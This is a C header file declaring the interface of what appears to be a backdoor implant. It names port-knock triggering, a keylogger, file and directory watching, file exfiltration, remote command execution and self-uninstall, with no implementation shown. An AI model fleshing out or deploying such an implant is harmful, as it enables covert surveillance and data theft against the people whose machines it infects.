#ifndef RUNNER_H
#define RUNNER_H

#include "context.h"
#include "commands.h"

struct Blob {
    struct Blob *next;
    struct Blob *prev;
    uint8_t data1;
    uint8_t data2;
    uint16_t seq_num;
    int marked;
};

struct List {
    struct Blob *head;
    struct Blob *tail;
    enum command_type type;
    size_t list_size;
};

int encode_ip(char *buffer, uint8_t byte1, uint8_t byte2, uint8_t byte3, uint8_t byte4);
int decode_ip(char *buffer, uint8_t *byte1, uint8_t *byte2, uint8_t *byte3, uint8_t *byte4);

int runner(struct Context *ctx);

int runner_recv(struct Context *ctx, struct List *list);

int knock_poll(struct Context *ctx);
int listen_knock(struct Context *ctx);

void free_list(struct List *list);
void print_list(struct List *list);

int cmd_uninstall(struct Context *ctx);

int cmd_req_file_name(struct Context *ctx, struct List *list);
int rep_req_file_data(struct Context *ctx);

int cmd_send_file_name(struct Context *ctx, struct List *list);

int cmd_start_kl(struct Context *ctx);
int cmd_start_watch_file(struct Context *ctx, struct List *list);
int cmd_start_watch_dir(struct Context *ctx, struct List *list);
int cmd_stop(struct Context *ctx);

int cmd_remote_run(struct Context *ctx, struct List *list);


#endif // RUNNER_H
